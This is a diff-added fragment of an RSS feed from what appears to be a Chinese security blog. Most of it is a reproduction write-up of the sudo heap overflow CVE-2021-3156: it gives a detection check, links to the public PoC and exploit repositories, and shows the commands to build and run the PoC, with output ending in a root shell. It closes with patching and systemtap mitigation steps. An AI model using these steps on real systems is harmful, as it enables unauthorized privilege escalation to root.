+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netsh int ipv6 &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; int *INTERFACENUMBER* &lt;span class=&#34;nv&#34;&gt;rabaseddnsconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;disable
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/145622.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.secpulse.com/archives/145622.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/forforever/p/13846077.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/forforever/p/13846077.html&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CVE-2021-3156漏洞复现</title>
+        <link>https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Tue, 02 Feb 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述&lt;/h2&gt;
+&lt;p&gt;1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，&lt;em&gt;&lt;strong&gt;它将在命令参数中使用反斜杠转义特殊字符&lt;/strong&gt;&lt;/em&gt;。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致&lt;em&gt;&lt;strong&gt;缓冲区溢出&lt;/strong&gt;&lt;/em&gt;。只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。&lt;/p&gt;
+&lt;h2 id=&#34;影响范围&#34;&gt;影响范围&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;sudo 1.8.2 - 1.8.31p2&lt;/li&gt;
+&lt;li&gt;sudo 1.9.0 - 1.9.5p1&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;首先查看sudo版本号  &lt;code&gt;sudo --version&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1612236259494.png&#34;
+	width=&#34;334&#34;
+	height=&#34;114&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1612236259494_hu92eac2a72f385cf08bcdbcfe1ac3109f_40297_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1612236259494_hu92eac2a72f385cf08bcdbcfe1ac3109f_40297_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612236259494&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;292&#34;
+		data-flex-basis=&#34;703px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;执行sudoedit -s /命令&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;若出现以“ sudoedit: ”开头的错误，则可能存在该漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;若出现以“ usage ”开头的错误，则无该漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;复现过程&#34;&gt;复现过程&lt;/h2&gt;
+&lt;p&gt;首先创建一个非root权限用户，然后下载&lt;a class=&#34;link&#34; href=&#34;https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;POC&lt;/a&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:/home$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; test-1/
+test@kali:~$ ls
+CVE-2021-3156_nss_poc_ubuntu.tar.gz
+test@kali:~$ tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz 
+CVE-2021-3156/
+CVE-2021-3156/hax.c
+CVE-2021-3156/lib.c
+CVE-2021-3156/Makefile
+test@kali:~$ ls
+CVE-2021-3156  CVE-2021-3156_nss_poc_ubuntu.tar.gz
+test@kali:~$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; CVE-2021-3156/
+test@kali:~/CVE-2021-3156$ ls
+hax.c  lib.c  Makefile
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;按照上面的步骤将下载下来的压缩包解压，然后进入文件夹编译程序。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:~/CVE-2021-3156$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o &lt;span class=&#34;s1&#34;&gt;&amp;#39;libnss_X/P0P_SH3LLZ_ .so.2&amp;#39;&lt;/span&gt; lib.c
+test@kali:~/CVE-2021-3156$ ls
+hax.c  lib.c  libnss_X  Makefile  sudo-hax-me-a-sandwich
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;编译好程序之后，执行&lt;code&gt;sudo-hax-me-a-sandwich&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+
+** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;
+
+using target: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&amp;#39;&lt;/span&gt;
+** pray &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; your rootshell.. **
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bl1ng bl1ng! We got it!
+&lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+
+** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;
+
+using target: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&amp;#39;&lt;/span&gt;
+** pray &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; your rootshell.. **
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bl1ng bl1ng! We got it!
+&lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可选参数貌似是0和1，不管使用哪个都能提权，显示的结果稍有不同，感兴趣的同学可以自行研究。&lt;/p&gt;
+&lt;h2 id=&#34;修补方法&#34;&gt;修补方法&lt;/h2&gt;
+&lt;p&gt;将sudo升级到安全版本&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://www.sudo.ws/download.html&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;临时修补方法&#34;&gt;临时修补方法&lt;/h2&gt;
+&lt;p&gt;对于无法立即更新的用户，建议使用systemtap进行以下临时缓解：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;安装所需的systemtap软件包和依赖项：&lt;/p&gt;
+&lt;p&gt;systemtap yum-utils kernel-devel-&amp;quot;$(uname -r)&amp;quot;&lt;/p&gt;
+&lt;p&gt;对于RHEL 7，使用命令安装 kernel debuginfo：debuginfo-install -y kernel-&amp;quot;$(uname -r)&amp;quot;。
+对于RHEL 8，使用命令安装 sudo debuginfo：debuginfo-install sudo。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;创建以下systemtap脚本（将文件命名为sudoedit-block.stap）:
+probe process(&amp;quot;/usr/bin/sudo&amp;quot;).function(&amp;ldquo;main&amp;rdquo;) {
+command = cmdline_args(0,0,&amp;quot;&amp;quot;);
+if (strpos(command, &amp;ldquo;edit&amp;rdquo;) &amp;gt;= 0) {
+raise(9);
+}
+}&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用以下命令安装脚本：（使用root权限）
+#nohup stap -g sudoedit-block.stap &amp;amp;
+该脚本将使得易受攻击的sudoedit二进制文件停止工作。sudo命令仍将照常工作。上述更改在重启后失效，必须在每次重启后重新应用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;一旦安装了补丁程序，就可以通过取消systemtap进程来删除systemtap脚本。例如，通过使用：
+#kill -s SIGTERM 7590 (其中7590是systemtap进程的PID)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;参考链接：&lt;a class=&#34;link&#34; href=&#34;https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;EXP地址：&lt;a class=&#34;link&#34; href=&#34;https://github.com/stong/CVE-2021-3156&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/stong/CVE-2021-3156&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;POC的github地址：&lt;a class=&#34;link&#34; href=&#34;https://github.com/blasty/CVE-2021-3156&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/blasty/CVE-2021-3156&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
